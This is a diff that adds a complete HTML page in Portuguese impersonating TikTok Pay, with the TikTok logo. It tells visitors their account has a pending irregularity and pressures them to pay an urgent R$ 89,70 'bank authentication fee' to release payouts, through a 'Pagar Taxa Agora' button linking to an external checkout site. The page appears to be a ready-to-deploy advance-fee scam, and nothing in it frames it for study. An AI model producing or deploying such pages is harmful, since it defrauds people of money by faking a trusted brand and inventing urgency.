@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Pay - Pendência na Conta</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body {
+      background: linear-gradient(135deg, #000000, #1a1a1a);
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: white;
+    }
+    .container {
+      background-color: #121212;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      position: relative;
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 16px;
+      color: #ffcc00;
+    }
+    p {
+      font-size: 16px;
+      color: #ccc;
+      margin-bottom: 20px;
+    }
+    .alerta {
+      background-color: #2a2a2a;
+      padding: 15px;
+      border-left: 4px solid #fe2c55;
+      margin-bottom: 25px;
+      font-size: 15px;
+      text-align: left;
+      border-radius: 10px;
+    }
+    .taxa {
+      background-color: #222;
+      padding: 20px;
+      border-radius: 12px;
+      font-size: 16px;
+      margin-bottom: 25px;
+    }
+    .taxa span {
+      display: block;
+      margin-top: 5px;
+      color: #ff5050;
+      font-weight: bold;
+    }
+    .btn-pagar {
+      background-color: #fe2c55;
+      color: white;
+      padding: 14px;
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn-pagar:hover {
+      background-color: #d9254a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/TikTok_logo.svg" alt="TikTok Logo" class="logo">
+    <h1>⚠️ Pendência Encontrada</h1>
+    <p>Identificamos uma irregularidade no seu cadastro. Para concluir a ativação e liberar os repasses da sua conta TikTok Pay, é necessário realizar uma ação imediata:</p>
+    <div class="alerta">
+      ⚠ A <strong>Taxa de Autenticação Bancária</strong> é obrigatória para validar seus dados financeiros e garantir segurança no processamento dos valores.
+    </div>
+    <div class="taxa">
+      Valor da Taxa: <strong>R$ 89,70</strong>
+      <span>Status: PENDENTE</span>
+    </div>
+    <a href="https://pay.realizar-pagamento.com/checkout/16ed8d5b-468d-404d-a683-edb3a795b524">
+      <button class="btn-pagar">Pagar Taxa Agora</button>
+    </a>
+  </div>
+</body>
+</html>
